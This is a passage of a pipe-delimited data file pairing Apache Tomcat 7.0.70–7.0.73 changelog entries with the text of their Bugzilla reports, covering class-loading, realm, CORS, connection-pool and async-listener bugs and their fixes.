    public void setValidationInterval(long validationInterval);"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60139
Other|Tomcat 7.0.73 (violetagg)|add||Add documentation to the bin/catalina.bat script to remind users that environment variables don't affect the configuration of Tomcat when run as a Windows Service. Based upon a documentation patch by James H.H. Lampert. (schultz)|||
Catalina|Tomcat 7.0.72 (violetagg)|fix||Ensure Digester.useContextClassLoader is considered in case the class loader is used. (violetagg)|||
Jasper|Tomcat 7.0.72 (violetagg)|fix|60101|Remove preloading of the class that was deleted. (violetagg)|7.0.71 (RC): Jasper fails to initialize when running with SecurityManager enabled|"Steps to reproduce:

1. Unzip apache-tomcat-7.0.71.zip
2. set JAVA_HOME=C:\Program Files (x86)\Java\jdk1.8.0_102  (or 6u45 - does not matter)
3. Start Tomcat with SecurityManager being enabled:
catalina.bat start -security

The following error is observed at startup:

java.lang.ClassNotFoundException: org.apache.jasper.runtime.JspRuntimeLibrary$PrivilegedIntrospectHelper
	at java.net.URLClassLoader.findClass(URLClassLoader.java:381)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:424)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:357)
	at org.apache.jasper.security.SecurityClassLoad.securityClassLoad(SecurityClassLoad.java:49)
	at org.apache.jasper.compiler.JspRuntimeContext.<clinit>(JspRuntimeContext.java:82)
	at java.lang.Class.forName0(Native Method)
	at java.lang.Class.forName(Class.java:348)
	at org.apache.catalina.core.JasperListener.lifecycleEvent(JasperListener.java:63)
<...>

I'll attach the log file (catalina.2016-09-09.log) with full stacktrace. This error is reported twice: the first time when it occurs in SecurityClassLoad.securityClassLoadand() and the second time when it pops up in JasperListener.lifecycleEvent().

4. Visit http://localhost:8080/

The page fails with Error 500:

java.lang.NoClassDefFoundError: Could not initialize class org.apache.jasper.compiler.JspRuntimeContext"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60101
jdbc-pool|Tomcat 7.0.72 (violetagg)|fix||Notify jmx when returning the connection that has been marked suspect. (kfujino)|||
jdbc-pool|Tomcat 7.0.72 (violetagg)|fix||Ensure that the POOL_EMPTY notification has been added to the jmx notification types. (kfujino)|||
Other|Tomcat 7.0.72 (violetagg)|update||Update the packaged version of the Tomcat Native Library to 1.2.10 to pick up the latest Windows binaries built with OpenSSL 1.0.2j. (markt)|||
Other|Tomcat 7.0.72 (violetagg)|update|61599|Update to Commons Daemon 1.1.0 for improved Java 9 support. (markt)|Update Commons Daemon for improved Java 9 support|"There are a number of Java 9 related bugs open against Commons Daemon. Noteably:

Finding Java 9 JREs:
https://issues.apache.org/jira/browse/DAEMON-376
https://issues.apache.org/jira/browse/DAEMON-373

Supporting Java 9 options:
https://issues.apache.org/jira/browse/DAEMON-374

Fixing this depends on there being a new Commons Daemon release"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61599
Catalina|Tomcat 7.0.71 (violetagg)|fix|57705|Add debug logging for requests denied by the remote host and remote address valves and filters. Based on a patch by Graham Leggett. (markt)|RemoteAddrValve: no log message no explanation when valve rejects request|"When the RemoteAddrValve denies a request, no message is logged, and no explanation appears in the generated HTML page.

There needs to be some indication that the RemoteAddrValve is involved so the admin isn't sent on a wild goose chase."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57705
Catalina|Tomcat 7.0.71 (violetagg)|update||Change the default of the sessionCookiePathUsesTrailingSlash attribute of the Context element to false since the problems caused when a Servlet is mapped to /* are more significant than the security risk of not enabling this option by default. (markt)|||
Catalina|Tomcat 7.0.71 (violetagg)|fix|59708|Modify the LockOutRealm logic. Valid authentication attempts during the lock out period will no longer reset the lock out timer to zero. (markt)|LockOutRealm Details|"Documentation for LockOutRealm does not specify if failed logins due to being locked out by the LockOutRealm count as failed logins for the purpose of locking out a user.

For example: Lets say I'm protecting an API with LockOutRealm and the authentication fails either due to maliciously bad password, accidentally bad password, or back-end auth fail. This results in a LockOut condition because it happened x times in y period. But the machines legitimately hitting the API don't care and continue to fail to authenticate during the LockOut period. Will the machines ever be allowed to authenticate or is this a critical failure of the API?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59708
Catalina|Tomcat 7.0.71 (violetagg)|fix||Improve error handling around user code prior to calling InstanceManager.destroy() to ensure that the method is executed. (markt)|||
Catalina|Tomcat 7.0.71 (violetagg)|fix||Ensure that reading the singleThreadModel attribute of a StandardWrapper via JMX does not trigger initialisation of the associated servlet. With some frameworks this can trigger an unexpected initialisation thread and if initilisation is not thread-safe the initialisation can then fail. (markt)|||
Catalina|Tomcat 7.0.71 (violetagg)|fix||By default, treat paths used to obtain a request dispatcher as encoded. This behaviour can be changed per web application via the dispatchersUseEncodedPaths attribute of the Context. (markt)|||
Catalina|Tomcat 7.0.71 (violetagg)|fix|59839|Apply roleSearchAsUser to all nested searches in JNDIRealm. (fschumacher)|roleSearchAsUser not applied to nested roles when roleNested enabled|"When using a JNDIRealm to search for a user's roles recursively via the 'roleNested' option while also binding using that user's credentials via the 'roleSearchAsUser' option, only the first role search actually binds using the user's credentials.  Subsequent searches of the nested roles revert to the original security environment, which leads to a NamingException reporting that a successful bind must be completed first (see below).

The cause is straightforward, from looking at the code.  I will refer to the code for 7.0.68, as that is what I've tested against, but I also see the same issue in the code for 7.0.70 and 8.5.3.  In ""JNDIRealm.java"" and the method getRoles() (starting on line 1938), there are two calls to context.search().  The first call on line 2002 is wrapped in logic which adds the user's credentials beforehand and removes them afterward, if 'roleSearchAsUser' was specified.  The second call on line 2056 is not wrapped in the same logic, but I'm guessing it should be.  This second call is only reached if 'roleNested' is true, per the if-block starting on line 2039.

The net result is that when anonymous binding is not allowed, the first search succeeds (assuming the user entered the correct credentials) and then the second one fails with a stack trace like the following.  I've redacted the company name and info:

javax.naming.NamingException: [LDAP: error code 1 - 000004DC: LdapErr: DSID-0C0906E8, comment: In order to perform this operation a successful bind must be completed on the connection., data 0, v1db1"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59839
Catalina|Tomcat 7.0.71 (violetagg)|add||Provide a mechanism that enables the container to check if a component (typically a web application) has been granted a given permission when running under a SecurityManager without the current execution stack having to have passed through the component. Use this new mechanism to extend SecurityManager protection to the system property replacement feature of the digester. (markt)|||
Catalina|Tomcat 7.0.71 (violetagg)|add||When retrieving an object via a ResourceLink, ensure that the object obtained is of the expected type. (markt)|||
Catalina|Tomcat 7.0.71 (violetagg)|fix|59866|When scanning WEB-INF/classes for annotations, don't scan the contents of WEB-INF/classes/META-INF (if present) since classes will never be loaded from that location. (markt)|Tomcat incorrectly scans WEB-INF/classes/META-INF/resources for classes|"During startup, Tomcat incorrectly scans the WEB-INF/classes/META-INF/resources folder to find classses, which also presents a performance penalty.

This happens in two situations:

1. When Tomcat tries to find classes to cache. The code in problem is at Line 2275 in [1]. It calls the webapp classloader's getResourceAsStream() method and eventually ends up doing a lookup in WEB-INF/classes/META-INF/resources for many Java class.

2. When Tomcat tries to load some classes using the webapp classloader, the classloader's findClassInternal() calls its findResourceInternal() method, which may do a lookup in its repository (aka WEB-INF/classes), see Line 3291 in [2].

The code actually does the lookup in the WEB-INF/classes/META-INF/resources is at Line 502 in [3]. The above situations can be easily observed by setting a breakpoint at this line and then start tomcat in debug mode with all the default configurations (addWebinfClassesResources is false, though even if it's set to true the above behavior is wrong).

This same issue may exist in Tomcat 8 and onwards as well.

[1] http://svn.apache.org/repos/asf/tomcat/tc7.0.x/tags/TOMCAT_7_0_70/java/org/apache/catalina/startup/ContextConfig.java
[2] http://svn.apache.org/repos/asf/tomcat/tc7.0.x/tags/TOMCAT_7_0_70/java/org/apache/catalina/loader/WebappClassLoaderBase.java
[3] http://svn.apache.org/repos/asf/tomcat/tc7.0.x/tags/TOMCAT_7_0_70/java/org/apache/naming/resources/BaseDirContext.java"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59866
Catalina|Tomcat 7.0.71 (violetagg)|fix|59912|Fix an edge case in input stream handling where an IOException could be thrown when reading a POST body. (markt)|CoyoteReader.readLine throws IO exception on multi line POST of exactly 8192 bytes|"Created attachment 34080 [details]
Zip with fiddler trace, servlet Java source, web.xml

Tomcat 8.0.33 (also fails on 7.0.55)
JDK 1.8.0_66

Wrote a servlet that simply calls readLine() on the HttpServletRequest.getReader() and dumps the incoming lines.

When I do a POST that has at least two lines in the body, with a content-length of exactly 8192 bytes, the last readLine() call throws an IOException.

8191 works fine, 8193 works fine, but 8192 bombs.

java.io.IOException
	at org.apache.catalina.connector.InputBuffer.reset(InputBuffer.java:576)
	at org.apache.catalina.connector.CoyoteReader.reset(CoyoteReader.java:142)
	at org.apache.catalina.connector.CoyoteReader.readLine(CoyoteReader.java:200)
	at com.cerner.TestServlet.service(TestServlet.java:33)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:729)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:292)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:207)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:240)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:207)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:212)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:106)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:502)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:141)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:79)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:616)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:88)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:522)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1095)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:672)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1502)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1458)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:745)

See attached servlet source, fiddler trace file."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59912
Catalina|Tomcat 7.0.71 (violetagg)|fix|59966|Do not start the web application if the error page configuration in web.xml is invalid. (markt)|Wrong configured error-page elements in deployment descriptor will become the fallback error-page|"Example scenario:

web.xml contains the following block:

...
<error-page>
  <error-code>java.lang.Throwable</error-code>
  <location>/unexpected.jsp</location>
</error-page>
...

This block wrongly contains ""error-type"" instead of ""error-code"".
When this application is deployed the error-page is registered as the default error page because org.apache.tomcat.util.descriptor.web.ErrorPage#setErrorCode catches NumberFormatException and assumes errorCode 0.

Then later when a request to a servlet is made which uses the sendError (e.g. with 404) method the page ""unexpected.jsp"" is displayed instead of the default 404 page.

It's also related to org.apache.catalina.core.StandardHostValve#status(Request request, Response response) where it says:
...
 ErrorPage errorPage = context.findErrorPage(statusCode);
        if (errorPage == null) {
            // Look for a default error page
            errorPage = context.findErrorPage(0);
        }
...

""context.findErrorPage(0)"" returns ""/unexpected.jsp"" although it should return null."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59966
Catalina|Tomcat 7.0.71 (violetagg)|fix||Switch the CGI servlet to the standard logging mechanism and remove support for the debug attribute. (markt)|||
Catalina|Tomcat 7.0.71 (violetagg)|add||Add a new initialisation parameter, envHttpHeaders, to the CGI Servlet to mitigate httpoxy (CVE-2016-5388) by default and to provide a mechanism that can be used to mitigate any future, similar issues. (markt)|||https://httpoxy.org
Catalina|Tomcat 7.0.71 (violetagg)|add||When adding and removing ResourceLinks dynamically, ensure that the global resource is only visible via the ResourceLinkFactory when it is meant to be. (markt)|||
Catalina|Tomcat 7.0.71 (violetagg)|fix|60008|When processing CORs requests, treat any origin with a URI scheme of file as a valid origin. (markt)|Tomcat CORS filter not allowing origin with file:// when resource access done from WebView|"The CORS filter not allowing request and returning 403 when the request is as follows.

Request Headers
POST http://kodiakptt.com/poc/ HTTP/1.1
Accept: application/json, text/plain, */*
Origin: file://
User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; XT1033 Build/KXB20.25-1.31) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36
Content-Type: application/json;charset=UT

We have a app which accesses the resource from tomcat web server, if UI is part of the app and using hosted JSCDE/mobile API js file, the webview send the request with Origin: file:// which tomcat rejects with 403 Forbidden."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60008
Catalina|Tomcat 7.0.71 (violetagg)|fix||Improve handling of exceptions during a Lifecycle events triggered by a state transition. The exception is now caught and the component is now placed into the FAILED state. (markt)|||
Catalina|Tomcat 7.0.71 (violetagg)|fix||Fix a file descriptor leak when reading the global web.xml. (markt)|||
Catalina|Tomcat 7.0.71 (violetagg)|fix|60041|Better error message if a JAR is deleted while a web application is running. Note: Deleting a JAR while the application is running is not supported and errors are expected. Based on a patch by gehui. (markt)|NPE in WebappClassLoaderBase|"After deploy war in tomcat, delete the jar in WEB-INF/lib/, then it may throws NullPointerException when load class


The reason as follow:

WebappClassLoaderBase (between line 3093 and 3110 in method openJARs())

    protected boolean openJARs() {
        if (started && (jarFiles.length > 0)) {
            lastJarAccessed = System.currentTimeMillis();
            if (jarFiles[0] == null) {
                for (int i = 0; i < jarFiles.length; i++) {
                    try {
                        jarFiles[i] = new JarFile(jarRealFiles[i]);
                    } catch (IOException e) {
                        if (log.isDebugEnabled()) {
                            log.debug(""Failed to open JAR"", e);
                        }
                        return false;
                    }
                }
            }
        }
        return true;
    }


If IOException is thrown in line 3099, the jarFiles will be [file1,file2,NULL,NULL,...]. after that, it will return true when invoke openJARs(), beacuse jarFiles[0] != null. 


WebappClassLoaderBase (between line 3271 and 3285 in method openJARs())

            if (openJARs()) {
                for (int i = 0; i < jarFiles.length; i++) {

                    jarEntry = jarFiles[i].getJarEntry(jarEntryPath);

                    if (jarEntry != null) {
                        try {
                            entry.manifest = jarFiles[i].getManifest();
                        } catch (IOException ioe) {
                            // Ignore
                        }
                        break;
                    }
                 }
             }



beacuse jarFiles=[file1,file2,NULL,NULL,...], so jarFiles[i] may be null, This will cause NullPointerException in line 3274. In this case, it is difficult to judge what went wrong.

I attached a patch that fixes it"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60041
Coyote|Tomcat 7.0.71 (violetagg)|fix||Improve error handling around user code prior to calling InstanceManager.destroy() to ensure that the method is executed. (markt)|||
Coyote|Tomcat 7.0.71 (violetagg)|fix|59904|Add a limit (default 200) for the number of cookies allowed per request. Based on a patch by gehui. (markt)|memory leak--ServerCookie|"heap dump:

Class Name	                        Objects	 Shallow Heap	Retained Heap
org.apache.tomcat.util.buf.ByteChunk	13220789 634597872	>=643312600
org.apache.tomcat.util.buf.MessageBytes 13194914 633355872	>=1801383536
org.apache.tomcat.util.buf.CharChunk	13204864 528194560	>=569456560
org.apache.tomcat.util.http.ServerCookie 2579614 123821472	>=1879787624


million+ ServerCookie objects in the heap,it cause memery leak.

org.apache.coyote.Request objcet contain a ServerCookies,it is a ServerCookie array,and the array length is 2048. 


so i have a test



		GetMethod getMethod = new GetMethod(""http://127.0.0.1:8080/"");

		Header h = new Header();
		h.setName(""Cookie"");
		StringBuilder sb=new StringBuilder();
		for(int i=0;i<2000;i++){
			sb.append(""a=b;"");
		}
		h.setValue(sb.toString());
		getMethod.addRequestHeader(h);

		int statusCode = httpClient.executeMethod(getMethod);


debug and get two thousand cookies in the request,and ServerCookie arrays is cached in heap.

we hava maxHeaderCount and maxHttpHeaderSize,but Cookie just as one header
so we need maxCookieCount too."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59904
Coyote|Tomcat 7.0.71 (violetagg)|fix||Make timing attacks against the Realm implementations harder. (schultz)|||
Coyote|Tomcat 7.0.71 (violetagg)|add||Refactor the code that implements the requirement that a call to complete() or dispatch() made from a non-container thread before the container initiated thread that called startAsync() completes must be delayed until the container initiated thread has completed. Rather than implementing this by blocking the non-container thread, extend the internal state machine to track this. This removes the possibility that blocking the non-container thread could trigger a deadlock. (markt)|||
Jasper|Tomcat 7.0.71 (violetagg)|fix||Improve error handling around user code prior to calling InstanceManager.destroy() to ensure that the method is executed. (markt)|||
Jasper|Tomcat 7.0.71 (violetagg)|fix||Improve the error handling for custom tags to ensure that the tag is returned to the pool or released and destroyed once used. (markt)|||
Jasper|Tomcat 7.0.71 (violetagg)|fix||Fixed StringIndexOutOfBoundsException. Based on a patch provided by wuwen via Github. (violetagg)|||
WebSocket|Tomcat 7.0.71 (violetagg)|fix||Improve error handling around user code prior to calling InstanceManager.destroy() to ensure that the method is executed. (markt)|||
WebSocket|Tomcat 7.0.71 (violetagg)|fix|59868|Clarify the documentation for the Manager web application to make clearer that the host name and IP address in the server section are the primary host name and IP address. (markt)|HTMLManager's output of host name and IP address is misleading|"I have configured my Connector to listen to address=""127.0.0.1"" only. Single hostname for this is ""localhost"". Though, the HTMLManager displays in Server Information my regular host name and the IP address of the second NIC (VirtualBox Host-Only Adapter).

Code:
        try {
            InetAddress address = InetAddress.getLocalHost();
            args[6] = address.getHostName();
            args[7] = address.getHostAddress();
        } catch (UnknownHostException e) {
            args[6] = ""-"";
            args[7] = ""-"";
        }

I would expect to display the information this Connector and Host is accepting, remove this information altogether or document that this information does not reflect configuration (docs/html-manager-howto.html#Server_Information)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59868
WebSocket|Tomcat 7.0.71 (violetagg)|fix|59908|Ensure that a reason phrase is included in the close message if a session is closed due to a timeout. (markt)|Tomcat reports empty(null) close reason if send operation timed out.|"If Tomcat tryes to send large enough message thought websoket (I've tested binary messages) not to fit into 20 sec timeout, session is closed with null reason.

""null"" reason goes from org.apache.tomcat.websocket.FutureToSendHandler.get(long, TimeUnit) method, which throws ""TimeoutException"" constructed with default constructor.

Later, in org.apache.tomcat.websocket.WsRemoteEndpointImplBase.handleSendFailureWithEncode(Throwable) CloseReason object is created, calling t.getMessage(), which returns null.

The expected behaviour is not to report null close reason, but instead report, that operation timed out."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59908
Web Applications|Tomcat 7.0.71 (violetagg)|fix||Do not log an additional case of IOExceptions in the error handler for the Drawboard WebSocket example when the root cause is the client disconnecting since the logs add no value. (markt)|||
Web Applications|Tomcat 7.0.71 (violetagg)|fix|59642|Mention the localDataSource in the DataSourceRealm section of the Realm How-To. (markt)|Mention localDataSource in realm-howto.html|"Please mention the localDataSource attribute in the DataSourceRealm section of realm-howto.html. 

This will save users some time, which are trying to use a DataSourceRealm with a data source defined in the same context."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59642
Web Applications|Tomcat 7.0.71 (violetagg)|fix||Follow-up to the fix for 59399. Ensure that the new attribute transportGuaranteeRedirectStatus is documented for all Realms. Also document the NullRealm and when it is automatically created for an Engine. (markt)|Tomcat doesn't support setting the response code for http -> https redirect|"Product: apache-tomcat-7.0.42
Version: 7-0.42
Component: Connector (guess)
Platform: x86_64
OS: Ubuntu Linux 12.04.2 LTS and CentOS Linux release 7.2.1511
Severity: enhancement
Java: jdk1.8.0_77

Tomcat 7.0.42 used as standalone web server port 80
configured with 

<transport-guarantee>CONFIDENTIAL</transport-guarantee> in web.xml

and 

<Connector port=""80"" protocol=""HTTP/1.1""
           connectionTimeout=""20000""
           redirectPort=""443"" />

<Connector port=""443"" maxThreads=""150"" scheme=""https"" secure=""true""
           SSLEnabled=""true"" keystoreFile=""/opt/keys/tomcat.keystore"" 
           keystorePass=""?"" clientAuth=""false"" keyAlias=""tomcat"" sslProtocol=""TLS"" />   

in server.xml

# curl -D /tmp/headers.txt -s http://localhost
# cat headers.txt

HTTP/1.1 302 Found
Server: Apache-Coyote/1.1
...
It doesn't seem to be possible to configure the response code for the http -> https redirect. 

Discussions with Google webmasters reveal that Google require a 301 moved permanently response to the http -> https redirect. This is key to maintaining existing rankings

Unfortunately Tomcat returns 302 temporary redirect when performing the redirection.

Implementing site wide https is also crucial to maintaining rankings unfortunately the benefits of doing this are largley negated by the inability to return the required status code.The only option is to undeploy https thereby once again harming rankings. 

A good Google ranking is the difference between making a profit and making a loss. Much as I don't like it, that's the way it is unfortunately."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59399
Web Applications|Tomcat 7.0.71 (violetagg)|fix||MBeans Descriptors How-To is moved to mbeans-descriptors-howto.html. Patch provided by Radoslav Husar. (violetagg)|||
Web Applications|Tomcat 7.0.71 (violetagg)|fix|60034|Correct a typo in the Manager How-To page of the documentation web application. (markt)|"typo in proxy servlet docs - ""is extremely help"""|"see https://tomcat.apache.org/tomcat-8.0-doc/manager-howto.html#What_is_JMX_Proxy_Servlet

""the UI is extremely help for integrating"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=60034
Tribes|Tomcat 7.0.71 (violetagg)|add||Add log message when the ping has timed-out. (kfujino)|||
Tribes|Tomcat 7.0.71 (violetagg)|fix||If the ping message has been received at the AbstractReplicatedMap#leftOver method, ensure that notify the member is alive than ignore it. (kfujino)|||
jdbc-pool|Tomcat 7.0.71 (violetagg)|fix||Fix the duplicated connection release when connection verification failed. (kfujino)|||
jdbc-pool|Tomcat 7.0.71 (violetagg)|fix||Ensure that do not remove the abandoned connection that has been already released. (kfujino)|||
jdbc-pool|Tomcat 7.0.71 (violetagg)|fix||In order to avoid the unintended skip of PoolCleaner, remove the check code of the execution interval in the task that has been scheduled. (kfujino)|||
jdbc-pool|Tomcat 7.0.71 (violetagg)|fix|59849|Ensure that the connection verification is executed by initSQL (if required) if the borrowing PooledConnection has not been initialized. (kfujino)|initSQL not executed when JDBC connection created under load|"Tomcat: 7.0.57
OS: SunOS HOST 5.10 Generic_150401-20 i86pc i386 i86pc
$ java -version
java version ""1.8.0_65""
Java(TM) SE Runtime Environment (build 1.8.0_65-b17)
Java HotSpot(TM) 64-Bit Server VM (build 25.65-b01, mixed mode)

Our application relies on initSQL to set the current_schema on each JDBC connection. We noticed that when our application is under heavy load (maxActive DB connections), the application sometimes gets handed a connection that did not have initSQL executed on it.

We had a look at the ConnectionPool.java source code (TOMCAT_7_0_57 and trunk) and found that there is a scenario where the pool creates a new connection without running `PooledConnection#validate(PooledConnection.VALIDATE_INIT)` on it.

To reproduce this issue, two conditions need to coincide:

1) The server has to be under load. The pool needs to be saturated to the point where no new connections get created for incoming requests (requests > maxActive). Threads block on the 'idle' queue/the waitcount atomic is > 0.

2) Active connections need to be released from the pool (unhandled exceptions, maxAge, suspectTimeout etc.)

Under load, the ConnectionPool#release method will create an 'ad-hoc' connection to replace the active connection it just removed from the ConnectionPool:

if (waitcount.get() > 0) {
   idle.offer(create(true));
} 

The #connect call for a PooledConnection object created this way follows in #borrowConnection instead of #createConnection. In #borrowConnection there is no call to #validate(VALIDATE_INIT) before that 'ad-hoc' connection is returned to the requesting thread.

Our best ""workaround"" at the moment: 
 - Use a validationQuery that fails when initSQL was not run
 - enable testOnBorrow
 - validationInterval at 1ms

The short validation interval is necessary because the 'ad-hoc' connection object will have its lastValidation time stamp set to currentTimeMillis on object creation, causing it to skip onBorrow validation immediately after it is being created.

Needless to say this workaround comes at a significant performance cost to the entire application (short validationInterval) in addition to creating those uninitialized DB connections just to throw them away immediately when they inevitably fail onBorrow validation."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59849
jdbc-pool|Tomcat 7.0.71 (violetagg)|fix|59850|Ensure that the ResultSet is closed when enabling the StatementCache interceptor. (kfujino)|StatementCache interceptor does not seem to close ResultSets|"It seems that when enabling the StatementCache interceptor, closeing the (proxy) statement does not cause open ResultSets to be closed.

This seems to be incorrect according to the Javadoc for Statement:

""A ResultSet object is automatically closed when the Statement object that generated it is closed, re-executed, or used to retrieve the next result from a sequence of multiple results."" -- <http://docs.oracle.com/javase/6/docs/api/java/sql/ResultSet.html>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59850
jdbc-pool|Tomcat 7.0.71 (violetagg)|fix|59923|Reduce the default value of validationInterval in order to avoid the potential issue that continues to return an invalid connection after database restart. (kfujino)|The default value of validationInterval attribute is too long.|"The validationInterval attribute is 30 seconds by default.
In case of DB reboots, trigger some problems.
For example, the following events will be considered.

1. The connection is validated.
2. DB reboots.
3. getConnection() within 30 seconds.
4. The connection isn't validated by testOnBorrow.
5. Get the invalid connection.

And worse, the default value of fairQueue is true.
As a result, invalid connection is continued to use.

Therefore, I think the default value should be more short or ""0(disable)""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59923
jdbc-pool|Tomcat 7.0.71 (violetagg)|fix||Ensure that the ResultSet is returned as Proxy object when enabling the StatementDecoratorInterceptor. (kfujino)|||
jdbc-pool|Tomcat 7.0.71 (violetagg)|fix|60043|Ensure that the suspectTimeout works without removing connection when the removeAbandoned is disabled. (kfujino)|"suspectTimeout does not work as expected without removeAbandoned=""true"" which does not match its documentation"|"Already posted this to the mailinglist here:

http://tomcat.10.x6.nabble.com/Question-about-suspectTimeout-property-of-pool-configuration-possible-Bug-does-only-work-with-removed-td5054070.html

If you configure the pool to have:

 logAbandoned=""true""
 suspectTimeout=""120""

set it does not report leaked connections even if you got leaked connections hanging in the busy queue.
To me this looks like a bug.

Docs tell this:


  Similar to to the removeAbandonedTimeout value but instead of treating
  the connection as abandoned, and potentially closing the connection,
  this simply logs the warning if logAbandoned is set to true.


Looking at the code however the suspect() method of a connection is only called from the PoolCleaner thread in the ""checkAbandoned()"" method.

But before calling that one it does check the pool configuration like this:

if (pool.getPoolProperties().isRemoveAbandoned())
                        pool.checkAbandoned();

but i don't want to configure removeAbandoned to true - i just want to get the suspect working like expected from reading the documentation of the property without actually removing the leaked connections.

Imho this needs to be changed - either the condition here is extended to look for suspectTimeout or the suspect is called in an extra method - i don't care which one is used ;)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=60043
jdbc-pool|Tomcat 7.0.71 (violetagg)|fix||Add log message of when returning the connection that has been marked suspect. (kfujino)|||
jdbc-pool|Tomcat 7.0.71 (violetagg)|fix||Correct Javadoc for ConnectionPool.suspect(). Based on a patch by Yahya Cahyadi. (markt)|||
Other|Tomcat 7.0.71 (violetagg)|add||Use the mirror network rather than the ASF master site to download the current ASF dependencies. (markt)|||
Other|Tomcat 7.0.71 (violetagg)|update||Update the packaged version of the Tomcat Native Library to 1.2.8 to pick up the latest fixes and make 1.2.8 the minimum recommended version. (markt)|||
Other|Tomcat 7.0.71 (violetagg)|fix||Fixed typos in mbeans-descriptors.xml files. (violetagg)|||
Other|Tomcat 7.0.71 (violetagg)|update||Update the internal fork of Commons BCEL to r1757132 to align with the BCEL 6 release. (markt)|||
Other|Tomcat 7.0.71 (violetagg)|update||Update the internal fork of Commons Codec to r1757174. Code formatting changes only. (markt)|||
Other|Tomcat 7.0.71 (violetagg)|update||Update the internal fork of Commons FileUpload to afdedc9. This pulls in a fix to improve the performance with large multipart boundaries. (markt)|||
Other|Tomcat 7.0.71 (violetagg)|fix||Update the download location for Objenesis. (violetagg)|||
Catalina|Tomcat 7.0.70 (violetagg)|fix|59219|Ensure AsyncListener.onError() is called if an Exception is thrown during async processing. (markt)|AsyncListener#onError not called on exception during async processing|"There are a couple of problems relating to error handling during exception
processing. Basically, Tomcat should ensure that the AsyncListener onError
and onComplete methods are correctly called if an exception occurs during
async processing in order to allow the listener code to release resources
and do clean-up. This does not seem to happen.

A sample servlet demonstrating the problem, AsyncDebugListener, is provided 
at the following location:

https://github.com/msnicklous/AsyncDebug

Build the AsyncDebugListener module using 'mvn install' and deploy it on Tomcat.

The service method and each of the AsyncListener methods logs output to the
AsyncListener.log file. You can follow execution by looking at the logs.

Assuming Tomcat is installed locally, you can use the following URLs:

1) No error - works correctly:

http://localhost:8080/AsyncDebugListener/ltest?reps=3

2) Exception during service method

http://localhost:8080/AsyncDebugListener/ltest?err

If async processing is started and an exception is thrown before the end of
the service method, AsyncListener#onError is not called, however onTimeout
followed by onComplete are both called. 

This is incorrect, as onError followed by onComplete should be called. 

3) Exception during processing of AsyncContext#dispatch() target

http://localhost:8080/AsyncDebugListener/ltest?reps=3&err

Precondition: Async processing is started and the request is dispatched using 
AsyncContext#dispatch(). The service method returns to the container.

If the container performs the resulting async dispatch and an exception is 
thrown, Tomcat drops the connection to the browser and no AsyncListener method
is called.

This is incorrect. Tomcat should flush the contents of the buffer to the 
browser and call the AsyncListener onError followed by the onComplete methods.

Thanks for having a look at this!"|https://bz.apache.org/bugzilla/show_bug.cgi?id=59219
Catalina|Tomcat 7.0.70 (violetagg)|fix|59220|Ensure that AsyncListener.onComplete() is called if the async request times out and the response is already committed. (markt)|AsyncListener#onComplete not called after timeout if buffer is flushed|"If an async dispatch cycle is started and a timeout occurs before the response
buffer is flushed using response#flushBuffer(), then the AsyncListener#onTimeout()
method followed by the AsyncListener#onComplete() are correctly called.

However, if the buffer is flushed before the timeout occurs, the 
AsyncListener#onTimeout() method will be called, but the 
AsyncListener#onComplete() will not be.

A sample servlet demonstrating the problem, AsyncDebugListener, is provided 
at the following location:

https://github.com/msnicklous/AsyncDebug

Build the AsyncDebugListener module using 'mvn install' and deploy it on Tomcat.

The service method and each of the AsyncListener methods logs output to the
AsyncListener.log file. You can follow execution by looking at the logs.

Assuming Tomcat is installed locally, you can use the following URLs:

1) No timeout - works correctly:

